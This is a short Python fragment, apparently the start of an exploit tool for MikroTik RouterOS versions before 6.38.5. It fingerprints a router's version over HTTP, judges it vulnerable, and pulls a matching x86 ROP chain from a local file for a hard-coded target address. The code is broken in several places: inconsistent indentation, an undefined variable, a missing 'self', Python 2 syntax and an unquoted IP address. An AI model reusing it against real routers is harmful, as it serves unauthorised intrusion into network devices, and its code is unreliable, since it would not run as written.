class Vuln():
	def __init__(self,ip,port=80):
		self.ip=ip
		self.port=port
		self.version=self.get_version()
		self.vulnerable=self.check_vulnerable()
		self.ropChain=self.get_rop()
	def get_version(self):
    	resp = requests.get('http://%s:%s'%(self.ip,self.port))
    	response = response.content.decode('utf-8','ignore')

    	read_index=response.find('<h1>RouterOS ')
    	from_header=response.text[read_index+14:]

    	end_index=from_header.find('</h1>')
    	router_version=from_header[:end_index]

    	return	router_version
    def check_vulnerable(self):
    	#We have to confirm this router version is earlier than 6.38.5
    	#Any better logic will be appreciated
    	router_version=self.version.replace('.','')#remove decimal points
    	router_version=router_version+'0'*(5-len(router_version))#pad to length of 5
    	if int(router_version)>63840:
        	return False
    	return True
    def get_rop():
    	ropfile=open('x86ropchains','rb').read()
        ropindexes,ropchains=ropfile.split(b'\n\n')
        ropindexes=ropindexes.split(b',')
        if self.version in ropindexes:
	        rop_offset=ropindexes.index(bytes(self.version))*932
	        ropchain=ropchains[rop_offset:rop_offset+932]
	        return ropchain
	    else:
	    	print "I may have skipped that one"

router=Vuln(20.20.20.237)